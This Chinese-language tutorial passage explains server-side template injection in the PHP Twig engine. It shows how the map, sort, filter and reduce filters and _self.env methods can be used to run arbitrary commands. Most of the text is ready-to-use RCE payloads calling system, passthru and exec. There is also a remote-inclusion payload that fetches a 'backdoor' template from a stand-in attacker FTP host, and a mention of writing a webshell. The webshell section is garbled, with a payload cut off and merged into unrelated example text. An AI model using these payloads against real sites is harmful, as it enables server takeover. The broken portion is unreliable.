这里主要就是利用 `_self` 变量，它会返回当前 `\Twig\Template` 实例，并提供了指向 `Twig_Environment` 的
`env` 属性，这样我们就可以继续调用 `Twig_Environment` 中的其他方法，从而进行 SSTI。
比如以下 Payload 可以调用 `setCache` 方法改变 Twig 加载 PHP 文件的路径，在 `allow_url_include`
开启的情况下我们可以通过改变路径实现远程文件包含：
    {{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
此外还有 `getFilter` 方法：
    public function getFilter($name)
      {
        ...
        foreach ($this->filterCallbacks as $callback) {
        if (false !== $filter = call_user_func($callback, $name)) {
          return $filter;
        }
      }
      return false;
    }
    public function registerUndefinedFilterCallback($callable)
    {
      $this->filterCallbacks[] = $callable;
    }
我们在 `getFilter` 里发现了危险函数 `call_user_func`。通过传递参数到该函数中，我们可以调用任意 PHP 函数。Payload
如下：
    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
### Twig2.x&Twig3.x:
这里看到一个通杀版本的payload，来学习一下：
#### Map：
    {{["id"]|map("system")|join(",")
我们去官网找一下map的用法：
    {% set people = [
        {first: "Bob",last:"Smith"},
        {first: "Alice",last:"A"},
    ] %}
    {{people|map(p => "#{p.first} #{p.last}")|join(', ')}}
    {# output Bob Smith, Alice A #}
允许用户传一个`arrow function， arrow function`最后会变成一个`closure`
举个例子
    {{["man"]|map((arg)=>"hello #{arg}")}}
会被编译成
    twig_array_map([0 => "man"], function ($__arg__) use ($context, $macros) { $context["arg"] = $__arg__; return ("hello " . ($context["arg"] ?? null))
`map` 对应的函数是`twig_array_map` ,下面是其实现
    function twig_array_map($array, $arrow)
    {
        $r = [];
        foreach ($array as $k => $v) {
            $r[$k] = $arrow($v, $k);//将arrow当作函数来进行执行
        }
        return $r;
    }
  * 从上面的代码我们可以看到，传入的 `$arrow` 直接就被当成函数执行，即 `$arrow($v, $k)`，而 `$v` 和 `$k` 分别是 `$array` 中的 value 和 key。`$array` 和 `$arrow` 都是我们我们可控的，那我们可以不传箭头函数，直接传一个可传入两个参数的、能够命令执行的危险函数名即可实现命令执行。通过查阅常见的命令执行函数：
    system ( string $command [, int &$return_var ] ) : string
    passthru ( string $command [, int &$return_var ] )
    exec ( string $command [, array &$output [, int &$return_var ]] ) : string
    shell_exec ( string $cmd ) : string
  * 前三个都可以使用。相应的 Payload 如下：
    {{["id"]|map("system")}}
    {{["id"]|map("passthru")}}
    {{["id"]|map("exec")}}    // 无回显
  * 其中，`{{["id"]|map("system")}}` 会被成下面这样：
    twig_array_map([0 => "id"], "sysetm")
  * 最终在 `twig_array_map` 函数中将执行 `system('id',0)`。
  * 还有`file_put_contents`函数写文件：
        file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] ) : int
当我们找到路径后就可以利用该函数进行写shell了
        ?name={{{" a.quantity  b.quantity)|column('name') %}
        {{ fruit }}
    {% endfor %}
    // Output in this order: Oranges, Grapes, Apples
  * 类似于 `map`，模板编译的过程中会进入 `twig_sort_filter` 函数，这个 `twig_sort_filter` 函数的源码如下：
    function twig_sort_filter($array, $arrow = null)
    {
        if ($array instanceof \Traversable) {
            $array = iterator_to_array($array);
        } elseif (!\is_array($array)) {
            throw new RuntimeError(sprintf('The sort filter only works with arrays or "Traversable", got "%s".', \gettype($array)));
        }
        if (null !== $arrow) {
            uasort($array, $arrow);    // 直接被 uasort 调用 
        } else {
            asort($array);
        }
        return $array;
    }
  * 从源码中可以看到，`$array` 和 `$arrow` 直接被 `uasort` 函数调用。众所周知 `uasort` 函数可以使用用户自定义的比较函数对数组中的元素按键值进行排序，如果我们自定义一个危险函数，将造成代码执行或命令执行：
    php > $arr = ["id",0];
    php > usort($arr,"system");
    uid=0(root) gid=0(root) groups=0(root)
    php >
  * 知道了做这些我们便可以构造 Payload 了：
    {{["id", 0]|sort("system")}}
    {{["id", 0]|sort("passthru")}}
    {{["id", 0]|sort("exec")}}    // 无回显
#### filter:
  * 这个 `filter` 过滤器使用箭头函数来过滤序列或映射中的元素。箭头函数用于接收序列或映射的值：
    {% set lists = [34, 36, 38, 40, 42] %}
    {{ lists|filter(v => v > 38)|join(', ') }}
    // Output: 40, 42
  * 类似于 `map`，模板编译的过程中会进入 `twig_array_filter` 函数，这个 `twig_array_filter` 函数的源码如下：
    function twig_array_filter($array, $arrow)
    {
        if (\is_array($array)) {
            return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH);    // $array 和 $arrow 直接被 array_filter 函数调用
        }
        // the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
        return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
    }
  * 从源码中可以看到，`$array` 和 `$arrow` 直接被 `array_filter` 函数调用。 `array_filter` 函数可以用回调函数过滤数组中的元素，如果我们自定义一个危险函数，将造成代码执行或命令执行：
    php > $arr = ["id"];
    php > array_filter($arr,"system");
    uid=0(root) gid=0(root) groups=0(root)
    php >
#### reduce：
这个
`reduce`filter使用arrow函数迭代地将序列或映射缩减为单个值，从而将其缩减为单个值。arrow函数接收上一次迭代的返回值和序列或映射的当前值：
    {% set numbers = [1, 2, 3] %}
    {{ numbers|reduce((carry, v) => carry + v) }}
    {# output 6 #}
这个 `reduce`过滤器需要 `initial`值作为第二个参数：
    {{ numbers|reduce((carry, v) => carry + v, 10) }}
    {# output 16 #}
注意arrow函数可以访问当前上下文。
    function twig_array_reduce($array, $arrow, $initial = null)
    {
    if (!\is_array($array)) {
    $array = iterator_to_array($array);
    }
    return array_reduce($array, $arrow, $initial);    
    // $array, $arrow 和 $initial 直接被 array_reduce 函数调用
    }
可以看到`array_reduce`是有三个参数的:`$array`和 `$arrow`直接被
`array_filter`函数调用，我们可以利用该性质自定义一个危险函数从而达到rce
payload:  
{{[0, 0]|reduce("system", "id")}}  
{{[0, 0]|reduce("passthru", "id")}}  
{{[0, 0]|reduce("exec", "id")}} // 无回显
参考文章：  